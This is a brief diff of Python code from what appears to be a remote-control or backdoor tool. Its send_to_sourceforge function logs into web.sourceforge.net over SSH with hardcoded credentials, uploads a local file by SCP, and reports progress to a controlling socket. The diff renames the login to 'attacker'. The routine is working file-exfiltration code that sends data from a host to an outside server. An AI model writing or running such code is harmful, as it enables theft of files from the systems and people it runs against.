@@ -55,7 +55,7 @@ def send_to_sourceforge(local_file_path, client_socket):
     try:
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh_client.connect("web.sourceforge.net", username="login123", password="hacker+")
+        ssh_client.connect("web.sourceforge.net", username="attacker", password="hacker+")
         client_socket.send(b"[+] Authenticating against web.sourceforge.net\n")
         with scp.SCPClient(ssh_client.get_transport()) as scp_client:
             scp_client.put(local_file_path)
